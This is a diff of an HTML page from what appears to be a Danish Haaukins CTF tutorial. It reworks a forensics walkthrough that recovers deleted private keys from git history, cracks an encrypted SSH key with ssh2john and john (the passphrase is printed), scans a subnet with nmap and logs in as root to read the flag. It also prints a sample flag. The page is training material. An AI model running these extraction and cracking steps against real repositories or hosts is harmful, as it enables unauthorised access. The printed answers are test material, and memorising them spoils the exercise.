@@ -22,22 +22,49 @@
 <div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Trin for trin</h2>
-<pre><code>sshpass -p haaukins ssh haaukins@securevpn.hkn   # bruger/password: haaukins/haaukins
-cd ~/infrastructure &amp;&amp; git log --oneline --all     # et Terraform-repo; commit-beskeder = vektor + hint
-# hent 'slettede' blobs (slettet fil = stadig et git-objekt):
-git rev-list --all --objects | awk '{print $1}' | while read o; do \
-  [ "$(git cat-file -t $o)" = blob ] &amp;&amp; git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' &amp;&amp; echo $o; done
-ssh2john key.enc > key.john &amp;&amp; john --wordlist=rockyou.txt key.john   # -> sexygirl1
-ssh -i key.enc -o PubkeyAcceptedKeyTypes=+ssh-rsa root@&lt;ip&gt; 'cat /root/flag.txt'</code></pre>
-             <p>Decoy: en ukrypteret nøgle giver også root men et forkert flag. Titlen siger "<strong>protected</strong>"
-             → det er den krypterede nøgle der har det rigtige.</p>
+<h2>SSH ind og læs historikken</h2>
+<pre><code>sshpass -p haaukins ssh haaukins@securevpn.hkn   # bruger/password givet i opgaveteksten
+cd ~/infrastructure &amp;&amp; git log --oneline --all</code></pre>
+             <p>Det er et Terraform-repo (DigitalOcean-droplets + Cloudflare DNS). Commit-beskederne
+             fortæller selv historien, ingen grund til at gætte:</p>
+             <pre><code># "Just realized that API should not be added to files in version control"
+# "Privatekeys shouldn't be in version controls as well"
+# "...this key is more secure [but] can easily be broken using <span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> the ripper with the rockyou wordlist"</code></pre>
+             <p>Den sidste besked er et gratis wordlist-hint, før vi overhovedet har set nøglen.</p>
+<h2>Hent de &#x27;slettede&#x27; nøgler ud af historikken</h2>
+<p>En fil fjernet i en senere commit er stadig et git-objekt. Gennemsøg ALLE blobs for
+             private nøgler, ikke kun den nuværende tilstand:</p>
+             <pre><code>git rev-list --all --objects | awk '{print $1}' | while read o; do \
+  [ "$(git cat-file -t $o)" = blob ] &amp;&amp; git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' &amp;&amp; echo $o; done</code></pre>
+             <p>To blobs: én ukrypteret OpenSSH-nøgle (i <code>wg-1.tf</code>s historik) og én krypteret
+             RSA-nøgle, AES-256-CBC (i <code>wg-2.tf</code>s historik) — det er DEN commit-beskeden om
+             rockyou pegede på, og det er den opgavetitlens "<strong>protected</strong>" refererer til.</p>
+             <pre><code>git cat-file -p &lt;wg2-blob&gt; | sed -n '/BEGIN RSA/,/END RSA/p' > wg2_enc.key
+<span class="gloss" tabindex="0" data-tip="Konverterer en krypteret SSH-nøgle til et format John kan angribe.">ssh2john</span> wg2_enc.key > wg2.john &amp;&amp; john --wordlist=rockyou.txt wg2.john   # -> sexygirl1
+ssh-keygen -p -P sexygirl1 -N '' -f wg2_dec.key</code></pre>
+<h2>Nøglen hører ikke til DENNE maskine</h2>
+<p>Prøver man den dekrypterede nøgle direkte mod <code>securevpn.hkn</code>, bliver den
+             afvist. Nøglen er til en AF DE TO DROPLETS Terraform-koden selv opretter (wg-1/wg-2) —
+             maskiner der er på samme VPN-undernet, men ikke i DNS. Scan undernettet for at finde dem:</p>
+             <pre><code><span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -p22 --open 34.25.151.0/24 -oG -      # -> .100 (wg-1) og .110 (wg-2)
+ssh -i wg2_dec.key -o PubkeyAcceptedKeyTypes=+ssh-rsa root@34.25.151.110 'cat /root/flag.txt'</code></pre>
+             <p>Nyere OpenSSH afviser ssh-rsa som standard, deraf <code>PubkeyAcceptedKeyTypes</code>.</p>
+             <p><strong>Decoy:</strong> den ukrypterede wg-1-nøgle giver OGSÅ root på <code>.100</code>, med
+             sit eget <code>flag.txt</code>, men det er det FORKERTE flag. Titlen "protected privatekey"
+             er det reelle vejskilt: det er den krypterede (wg-2) nøgle opgaven spørger om.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flaget ligger i <code>/root/flag.txt</code> på den droplet den krypterede nøgle hører til.</p>
         <p>Flag (per-instans): <span class="flag">HKN{1iV-Fek-cfzN}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li><code>git rev-list --all --objects</code> + <code>git cat-file</code> henter 'slettede' hemmeligheder frem.</li><li>Passphrase-beskyttede nøgler → <code>ssh2john</code> + john; nyere OpenSSH kræver <code>+ssh-rsa</code>.</li><li>Læs titlen for at vælge den rigtige nøgle (decoy-fælde).</li></ul>
+<ul><li><code>git rev-list --all --objects</code> + <code>git cat-file</code> henter 'slettede' hemmeligheder frem.</li><li>Passphrase-beskyttede nøgler: <code>ssh2john</code> + john; nyere OpenSSH kræver <code>+ssh-rsa</code>.</li><li>En fundet SSH-nøgle autoriserer ikke nødvendigvis den maskine du allerede er på, tjek om IaC-koden selv opretter ANDRE hosts (her: scan undernettet).</li><li>Læs titlen for at vælge den rigtige nøgle (decoy-fælde).</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>At "slette" en hemmelighed fra en fil og committe fjernder den ikke, den gamle version
+lever videre som et git-objekt i historikken. Det er en af de hyppigste rigtige secret-læk:
+API-nøgler, passwords og private nøgler der blev fjernet i en senere commit, men stadig kan hentes
+frem. Værktøjer som <code><span class="gloss" tabindex="0" data-tip="Scanner (bl.a.) git-historik for højt-entropi-strenge og kendte secret-mønstre.">trufflehog</span></code> og <code><span class="gloss" tabindex="0" data-tip="Scanner et git-repo&#x27;s historik for lækkede secrets/nøgler.">gitleaks</span></code> scanner netop hele
+git-historikken for den slags. Når du får adgang til et repo, så gennemsøg historikken, ikke kun
+den nuværende tilstand, og læs commit-beskederne, de peger tit på hvad der skete.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
